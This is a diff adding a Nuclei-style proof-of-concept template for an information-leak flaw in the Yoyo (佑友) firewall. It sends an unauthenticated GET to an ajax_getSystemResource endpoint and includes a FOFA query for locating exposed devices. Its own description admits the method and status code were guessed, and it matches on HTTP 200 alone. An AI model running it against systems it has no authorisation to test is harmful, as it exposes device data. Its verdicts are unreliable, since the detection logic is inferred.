@@ -1,0 +1,23 @@
+id: poc-e06c4f18b3dc47c4dcf5
+info:
+  name: 佑友防火墙存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e06c4f18b3dc47c4dcf5192603988f8d
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e06c4f18b3dc47c4dcf5192603988f8d
+    fofa: fofa：title="佑友防火墙"
+http:
+- raw:
+  - 'GET /index.php?c=index&a=ajax_getSystemResource HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
